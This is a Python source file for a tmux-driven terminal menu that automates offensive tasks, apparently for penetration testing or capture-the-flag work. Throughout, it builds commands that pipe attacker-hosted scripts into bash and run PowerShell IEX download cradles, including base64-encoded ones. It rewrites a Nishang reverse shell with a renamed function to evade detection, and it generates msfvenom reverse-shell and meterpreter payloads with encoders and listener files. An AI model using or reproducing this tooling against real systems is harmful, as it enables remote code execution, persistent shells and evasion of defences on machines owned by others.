#!/usr/bin/env python3

from simple_term_menu import TerminalMenu
import os
import string
import random
import base64

NISHANG_SCRIPT = '/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1'

def get_ip(iface):
    cmd = f"ip a s {iface} | grep -Eo \'[0-9]{{1,3}}\\.[0-9]{{1,3}}\\.[0-9]{{1,3}}\\.[0-9]{{1,3}}\' | head -n 1"
    return os.popen(cmd).read().strip('\n')

def interfaces():
    cmd = 'ip l | grep -E \'^[[:digit:]]+: \' | cut -d \':\' -f 2'
    lines = os.popen(cmd).readlines()
    interfaces = list(map(lambda x: x.strip('\n '), lines))
    if 'tun0' in interfaces and not 'tun1' in interfaces:
        return 'tun0'
    print("Select interface.")
    menu = TerminalMenu(interfaces)
    index = menu.show()
    return interfaces[index]

def get_interface_ip():
    return get_ip(interfaces())

def strip_lines(lines):
    return list(map(lambda x: x.strip('\n '), lines))

def copy_to_tmux(text):
    print(text)
    cmd2 = f"echo -n {text} | tmux loadb -"
    os.system(cmd2)

def select_pane():
    cmd = "tmux list-panes | grep -v active"
    panes = list(map(lambda x: x.strip('\n '), os.popen(cmd).readlines()))
    if len(panes) == 1:
        return panes[0].split(' ')[-1]
    else:
        print("Select pane.")
        menu = TerminalMenu(panes)
        index = menu.show()
        return panes[index].split(' ')[-1]

def copy_to_pane(text):
    pane = select_pane()
    os.system(f"tmux send-keys -t {pane} '{text}'")
    
def copy_to_menu(text):
    options = ["To tmux buffer", "To tmux pane..."]
    terminal_menu = TerminalMenu(options)
    index = terminal_menu.show()
    if index == 0:
        copy_to_tmux(text)
    elif index == 1:
        copy_to_pane(text)

def stabilize_shell():
    options = ['python3', 'python']
    index = TerminalMenu(options).show()
    py = options[index]
    pane = select_pane()
    cmd = f"tmux send-keys -t {pane} {py} Space -c Space \\' 'import pty;pty.spawn(\"/bin/bash\")' \\' Enter"
    os.system(cmd)
    cmd = f"tmux send-keys -t {pane} C-z 'stty size' Enter 'stty raw -echo; fg' Enter '' Enter 'stty rows 60 cols 235' Enter 'export TERM=xterm' Enter"
    os.system(cmd)

def get_apache_file(pattern):
    print("Choose file...")
    if pattern == '':
        cmd = "ls /var/www/html"
    else:
        cmd = f"ls /var/www/html | grep '{pattern}$'"
    files = strip_lines(os.popen(cmd).readlines())
    index = TerminalMenu(files).show()
    print(files[index])
    return files[index]

def get_temp_python_file(pattern):
    ip = get_interface_ip()
    cmd = "ps -ef | grep http.server | grep -v grep"
    output = os.popen(cmd).read()
    items = list(map(lambda x: x.strip('\n'), filter(lambda x: len(x) > 0, output.split(' '))))
    print(items)
    port = items[-1]
    pid = items[1]
    if pattern == '':
        cmd = f"ls /proc/{pid}/cwd"
    else:
        cmd = f"ls /proc/{pid}/cwd | grep '{pattern}$'"
    files = strip_lines(os.popen(cmd).readlines())
    index = TerminalMenu(files).show()
    filename = files[index]
    url = f"http://{ip}:{port}/{filename}"
    return url

def select_python_http():
    cmd = "ps -ef | grep http.server | grep -v grep"
    lines = os.popen(cmd).readlines()
    pids = []
    ports = []
    options = []
    for l in lines:
        items = list(map(lambda x: x.strip('\n'), filter(lambda x: len(x) > 0, l.split(' '))))
        port = items[-1]
        pid = items[1]
        pids.append(pid)
        ports.append(port)
        options.append(f"PID {pid} Port {port}")
    if len(options) == 1:
        return pids[0], ports[0]
    elif len(options) == 0:
        raise Exception('No Python HTTP servers')
    else:
        print("Select Python HTTP Server")
        index = TerminalMenu(options).show()
        return pids[index], ports[index]

def copy_nishang(ip, port, directory):
    lines = open(NISHANG_SCRIPT, 'r').readlines()
    randomName = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
    functionName = 'Invoke-' + randomName
    filename = f"{randomName}.ps1"
    output = ''
    comment = False
    for l in lines:
        if l.startswith('<#'): # strip comments
            comment = True
        if l.startswith('function '):
            output += f"function {functionName}\n" # rename the invoke function so it's not as easy to detect
        elif not comment:
            output += l
        if l.startswith('#>'):
            comment = False
    output += '\n' + f"{functionName} -Reverse -IPAddress {ip} -Port {port}"

    f = open(directory + filename, 'w')
    f.write(output)
    f.close
    return filename

def is_python_http_running():
    cmd = "ps -ef | grep http.server | grep -v grep"
    output = os.popen(cmd).read()
    return len(output.strip('\n ')) > 0

def linux_menu():
    options = ["Stabilize shell", "wget a file", "curl file and pipe to bash"]
    terminal_menu = TerminalMenu(options)
    index = terminal_menu.show()
    print(options[index])
    if index == 0:
        stabilize_shell()
    elif index == 1 or index == 2:
        ip = get_interface_ip()
        if index == 1:
            file = get_apache_file('')
            cmd = f"wget {ip}/{file}"
        elif index == 2:
            file = get_apache_file('.sh')
            cmd = f"curl {ip}/{file} | bash"
        copy_to_pane(cmd)

def choose_apache_or_python():
    print("Get file from apache or temp python server?")
    index = TerminalMenu(["Apache", "Python HTTP"]).show()
    return index == 0

def nishang_shell_menu():
    if is_python_http_running():
        rev_shell_port = input("Enter port for nishang reverse shell to connect: ")
        pid, port = select_python_http()
        print(f"Server {pid} on port {port}")
        directory = f"/proc/{pid}/cwd/"
        ip = get_interface_ip()
        filename = copy_nishang(ip, rev_shell_port, directory)
        url = f"http://{ip}:{port}/{filename}"
        print(f"Nishang URL: {url}")
        pscommand = f"IEX(New-Object Net.WebClient).downloadString('{url}')"
        print(f"Commnad: powershell -c \"{pscommand}\"")
        utf16 = pscommand.encode('utf-16le')
        b = base64.b64encode(utf16).decode('latin1')
        print(f"Encoded: powershell -Enc {b}")
        input('Press any key to continue')

def msfvenom_generate_menu(ip, directory):
    # select windows/linux
    options = ['windows', 'linux']
    index = TerminalMenu(options).show()
    platform = options[index]
    print(platform)
    
    # select shell or meterpreter
    options = ['shell', 'meterpreter']
    index = TerminalMenu(options).show()
    shellType = options[index]
    print(shellType)

    # select x86/x64
    options = ['x86', 'x64']
    index = TerminalMenu(options).show()
    arch = options[index]
    print(arch)

    if shellType == 'shell': sh = 'shell_'
    else:
        options = ['staged', 'unstaged']
        index = TerminalMenu(options).show()
        if index == 0: sh = 'meterpreter/'
        else: sh = 'meterpreter_'
    
    sh += 'reverse_tcp'
    
    if platform == 'windows' and arch == 'x86':    
        payload = f"{platform}/{sh}"
    else:
        payload = f"{platform}/{arch}/{sh}"

    print(f"Payload: {payload}")
    
    # enter revshell port
    port = input("Enter reverse shell port: ")

    # read format
    if platform == 'windows':
        options = ['exe','dll','asp','msi','psh','psh-cmd','vba','asp','aspx','aspx-exe']
    else:
        options = ['elf','elf-so']
    index = TerminalMenu(options).show()
    format = options[index]
    print(format)

    randomName = ''.join(random.choice(string.ascii_lowercase) for i in range(8))

    # if meterpreter, generate RC file as well to launch msfconsole with the right kind of multi/handler listener
    if shellType == 'meterpreter':
        filename = f"listen-{randomName}.rc"
        f = open(filename, 'w') # put in current working directory
        f.write(f"""use multi/handler
set payload {payload}
set lhost {ip}
set lport {port}
run
        """)
        f.close()
        print(f"Generated RC file: {filename}")
        print(f"Listener command: msfconsole -r {filename}")
    
    # select encoders or none, different ones for x86 and x64
    # if encoders are used, enter iterations
    options = ['None']
    if arch == 'x86':
        options.append('x86/shikata_ga_nai')
    elif arch == 'x64':
        options.append('x64/zutto_dekiru')
    print("Select encoder")
    index = TerminalMenu(options).show()
    print(f"Encoder {options[index]}")
    if index == 0: encoder = ''
    else: encoder = options[index]

    iterations = 0
    if len(encoder) > 0:
        iterations = int(input("Enter encoder iterations: "))
    
    filename = f"{directory}{randomName}.{format}"
    cmd = f"msfvenom -p {payload} LHOST={ip} LPORT={port} -f {format} -o {filename}"
    if len(encoder) > 0:
        cmd += f" -e {encoder} -i {iterations}"

    print(cmd)
    os.system(cmd)

def msfvenom_menu():
    ip = get_interface_ip()
    directory = ''
    if is_python_http_running():
        pid, _ = select_python_http()
        directory = f"/proc/{pid}/cwd/"
    msfvenom_generate_menu(ip, directory)

def windows_menu():
    options = ["wget outfile", "IEX download and run script", "Prepare nishang reverse shell"]
    index = TerminalMenu(options).show()
    print(options[index])
    if index == 0 or index == 1:
        useApache = True
        if is_python_http_running(): useApache = choose_apache_or_python()
        ip = get_interface_ip()
        pane = select_pane()
        if index == 0:
            if useApache:
                file = get_apache_file('')
                url = f"{ip}/{file}"
            else:
                url = get_temp_python_file('')
                file = url.split('/')[-1]
            cmd = f"tmux send-keys -t {pane} 'wget '{url}' -outfile {file}'"
        elif index == 1:
            if useApache:
                file = get_apache_file('.ps1')
                url = f"http://{ip}/{file}"
            else:
                url = get_temp_python_file('.ps1')
            cmd = f"tmux send-keys -t {pane} 'IEX(New-Object Net.WebClient).downloadString(' \\' '{url}' \\' ')'"
        os.system(cmd)
    elif index == 2:
        nishang_shell_menu()

def main():
    os.system("pwd")
    options = ["Copy my IP", "Linux shell commands", "Windows shell commands", "Copy python HTTP", "MSFVenom", "Start apache"]
    terminal_menu = TerminalMenu(options)
    index = terminal_menu.show()
    print(options[index])
    if index == 0:
        copy_to_menu(get_interface_ip())
    elif index == 1:
        linux_menu()
    elif index == 2:
        windows_menu()
    elif index == 3:
        if is_python_http_running():
            copy_to_pane(get_temp_python_file(''))
        else:
            input("Start python http server and try again")
    elif index == 4:
        msfvenom_menu()
    elif index == 5:
        print("Starting apache... sudo required")
        os.system("sudo systemctl start apache2")

if __name__ == "__main__":
    main()